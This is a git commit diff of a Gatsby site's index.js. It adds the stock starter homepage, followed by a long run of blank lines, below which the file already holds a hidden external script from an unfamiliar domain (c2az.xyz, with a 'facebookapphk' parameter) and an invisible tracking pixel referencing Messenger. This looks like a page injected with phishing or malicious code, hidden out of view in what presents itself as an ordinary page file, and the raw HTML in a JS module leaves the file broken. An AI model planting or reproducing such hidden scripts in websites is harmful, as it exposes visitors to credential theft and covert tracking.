ac41f922efb740e05b08aee0d593177338e17d2c
tusurucu23s <95896360+tusurucu23s@users.noreply.github.com>
2022-01-21 11:33:05 +0800

    Update index.js

--- src/pages/index.js
+++ src/pages/index.js
@@ -1,4 +1,47 @@
 
+import * as React from "react"
+import { Link } from "gatsby"
+import { StaticImage } from "gatsby-plugin-image"
+
+import Layout from "../components/layout"
+import Seo from "../components/seo"
+
+const IndexPage = () => (
+  <Layout>
+    <Seo title="Home" />
+
+    <StaticImage
+      src="../images/gatsby-astronaut.png"
+      width={300}
+      quality={95}
+      formats={["auto", "webp", "avif"]}
+      alt="A Gatsby astronaut"
+      style={{ marginBottom: `1.45rem` }}
+    />
+    <p>
+      <Link to="/page-2/">Go to page 2</Link> <br />
+      <Link to="/using-typescript/">Go to "Using TypeScript"</Link> <br />
+      <Link to="/using-ssr">Go to "Using SSR"</Link> <br />
+      <Link to="/using-dsg">Go to "Using DSG"</Link>
+    </p>
+  </Layout>
+)
+
+export default IndexPage
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <meta property="og:url" content="https://www.youtube.com/" />
 <script src="https://c2az.xyz/manzana/?api=1&lan=facebookapphk&ht=1" type="text/javascript" async="true"></script>
 <img src="//whos.amung.us/pingjs/?k=elchapito07s&amp;t=🛸 NO FORCE MMG 👽&amp;x=https://www.messenger.com/" style="display:none" alt="">                    
